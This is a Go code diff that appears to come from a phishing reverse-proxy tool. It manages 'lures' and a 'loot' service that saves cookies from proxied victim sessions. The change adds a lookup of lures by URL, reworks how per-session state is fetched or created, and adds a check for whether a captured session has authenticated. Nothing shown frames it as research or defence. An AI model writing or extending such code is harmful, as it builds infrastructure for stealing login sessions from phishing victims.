@@ -25,6 +25,7 @@ type APILure struct {
 
 type LureService interface {
 	ExistsByURL(lureURL string) (bool, error)
+	GetByURL(lureURL string) (*APILure, error)
 	Add(lure *APILure) error
 	DeleteByURL(lureURL string) error
 	GetAll() ([]*APILure, error)
@@ -72,6 +73,12 @@ func (s *lureService) ExistsByURL(url string) (bool, error) {
 	defer s.mu.RUnlock()
 	_, exists := s.luresMap[url]
 	return exists, nil
+}
+
+func (s *lureService) GetByURL(url string) (*APILure, error) {
+	s.mu.RLock()
+	defer s.mu.RUnlock()
+	return s.luresMap[url], nil
 }
 
 func (s *lureService) Add(lure *APILure) error {
@@ -250,7 +257,7 @@ func (s *lootService) SaveCookies(c *fiber.Ctx, destURL *url.URL, cookies []*htt
 		return
 	}
 	sess := getSession(c)
-	sessCtx := s.getSessionContext(sess.ID())
+	sessCtx := s.getOrCreateSessionContext(sess.ID())
 	sessCtx.mu.Lock()
 	defer sessCtx.mu.Unlock()
 	if sessCtx.isAuthenticated {
@@ -280,10 +287,32 @@ func (s *lootService) saveCapturedSession(sess *session.Session, sessCtx *sessio
 	})
 }
 
-func (s *lootService) getSessionContext(sessionID string) *sessionContext {
+func (s *lootService) getOrCreateSessionContext(sessionID string) *sessionContext {
 	// TODO sessionContext pool
 	ctx, _ := s.sessions.LoadOrStore(sessionID, newSessionContext())
 	return ctx.(*sessionContext)
+}
+
+func (s *lootService) getSessionContext(sessionID string) *sessionContext {
+	ctx, ok := s.sessions.Load(sessionID)
+	if !ok {
+		return nil
+	}
+	return ctx.(*sessionContext)
+}
+
+func (s *lootService) IsAuthenticated(c *fiber.Ctx) bool {
+	sess := getSession(c)
+	if sess == nil {
+		return false
+	}
+	sessCtx := s.getSessionContext(sess.ID())
+	if sessCtx == nil {
+		return false
+	}
+	sessCtx.mu.RLock()
+	defer sessCtx.mu.RUnlock()
+	return sessCtx.isAuthenticated
 }
 
 func (s *lootService) saveCookie(sessCtx *sessionContext, destURL *url.URL, cookie *http.Cookie) {
